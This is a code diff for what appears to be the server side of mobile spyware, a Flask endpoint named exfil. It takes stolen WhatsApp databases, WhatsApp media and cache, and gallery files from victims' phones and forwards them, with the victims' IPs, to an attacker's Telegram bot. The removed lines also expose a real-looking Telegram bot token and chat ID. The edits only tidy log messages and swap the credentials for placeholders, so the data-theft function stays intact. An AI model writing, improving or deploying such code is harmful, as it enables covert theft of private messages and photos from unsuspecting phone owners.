@@ -12,8 +12,8 @@ app = Flask(__name__)
 # ============================================================
 # CONFIG — CHANGE THESE
 # ============================================================
-TELEGRAM_TOKEN = "8440979863:AAE8OS_UzuvJV6T-sEqC9PuO0TvNUNapur8"
-TELEGRAM_CHAT_ID = "8204622013"
+TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE"
+TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
 # ============================================================
 
 # Create folders (for temporary storage)
@@ -190,7 +190,7 @@ def exfil():
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
-        # 7. WHATSAPP DATABASE
+        # 7. WHATSAPP DATABASE — FIXED
         # ============================================================
         if data_type == 'whatsapp_database':
             filename = data.get('filename', 'unknown')
@@ -201,11 +201,11 @@ def exfil():
                     f.write(base64.b64decode(raw))
                 send_file_to_telegram(safe_name, f"📊 <b>WhatsApp Database</b>\n📄 {filename}\nIP: {ip}")
                 os.remove(safe_name)
-                print(f"[✓] WhatsApp DB: {filename}")
+                print(f"[✓] WhatsApp DB forwarded: {filename}")
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
-        # 8. WHATSAPP MEDIA
+        # 8. WHATSAPP MEDIA — FIXED
         # ============================================================
         if data_type == 'whatsapp_media':
             filename = data.get('filename', 'unknown')
@@ -217,11 +217,11 @@ def exfil():
                     f.write(base64.b64decode(raw))
                 send_file_to_telegram(safe_name, f"💬 <b>WhatsApp Media</b>\n📄 {filename}\n📂 {filepath}")
                 os.remove(safe_name)
-                print(f"[✓] WhatsApp Media: {filename}")
+                print(f"[✓] WhatsApp Media forwarded: {filename}")
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
-        # 9. WHATSAPP CACHE
+        # 9. WHATSAPP CACHE — FIXED
         # ============================================================
         if data_type == 'whatsapp_cache':
             filename = data.get('filename', 'unknown')
@@ -232,7 +232,7 @@ def exfil():
                     f.write(base64.b64decode(raw))
                 send_file_to_telegram(safe_name, f"💾 <b>WhatsApp Cache</b>\n📄 {filename}")
                 os.remove(safe_name)
-                print(f"[✓] WhatsApp Cache: {filename}")
+                print(f"[✓] WhatsApp Cache forwarded: {filename}")
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
@@ -263,7 +263,7 @@ def exfil():
                     f.write(base64.b64decode(raw))
                 send_file_to_telegram(safe_name, f"📁 <b>Gallery File</b>\n📄 {filename}\n📂 {filepath}")
                 os.remove(safe_name)
-                print(f"[✓] Gallery file: {filename}")
+                print(f"[✓] Gallery file forwarded: {filename}")
             return jsonify({"status": "OK"}), 200
         
         # ============================================================
